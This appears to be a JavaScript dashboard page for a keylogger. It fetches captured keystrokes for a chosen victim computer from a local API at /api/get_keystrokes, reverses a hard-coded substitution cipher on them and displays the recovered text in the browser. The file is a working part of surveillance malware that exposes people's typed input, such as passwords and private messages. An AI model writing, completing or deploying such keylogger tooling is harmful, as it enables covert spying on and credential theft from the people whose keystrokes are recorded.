const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ".split("");
const nambers = "0123456789".split("")
const punctuation = "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";

const allCharacters = [...punctuation, ...nambers, ...letters];
console.log(allCharacters);
const key = ['H', 'E', 'n', 'x', '@', 'U', '5', 'P', '=', '0', '-', '3', 'm', '*', 'L', 'f', '7', 'g', '$', '!', 'V', '_', 'Z', 'O', 'X', '1', 'k', '?', '(', '\\', 'N', ':', 'e', 'p', '>', '`', 'h', '^', 'I', '#', 'a', 'Y', '"', 'l', 'Q', '[', ' ', 'C', 'J', '+', 'T', 's', '/', 'i', 't', 'S', ']', 'w', 'u', ')', 'A', 'F', '{', ',', '8', 'R', '2', '.', 'o', 'b', 'r', "'", '%', 'c', '&', 'D', ';', '<', '9', '4', 'd', 'z', '|', 'y', '}', 'j', 'G', '6', 'M', '~', 'v', 'B', 'W', 'q', 'K']
console.log(key.length)
const urlparams =  new URLSearchParams(window.location.search)
const computer = urlparams.get("computer")
console.log("computer:::::::",computer)

fetch("http://127.0.0.1:5000/api/get_keystrokes?" + computer).then(
    response => response.json().then(
        dat => {
            console.log(dat)
            dat.data.forEach(item => {
                console.log(item.decrypted_words)
                const decrypted = deciphering(item.decrypted_words)
                const new_element = document.createElement("p")
                new_element.textContent = decrypted
                document.body.appendChild(new_element)
             
            });

        }
    )
)
const deciphering = (text) => {
    console.log("^^^^^^^^^^^^^^^^^^^^^")
    let decrypted = ""
    for (let i = 0; i < text.length; i++){
        let char = allCharacters[key.indexOf(text[i])]
        if (char != undefined){
        decrypted += char
        }else{
            decrypted += "\n"
        }
    }
    console.log(decrypted)
    return decrypted
}

const myString = "שורה ראשונה\nשורה שניה";
console.log(myString);
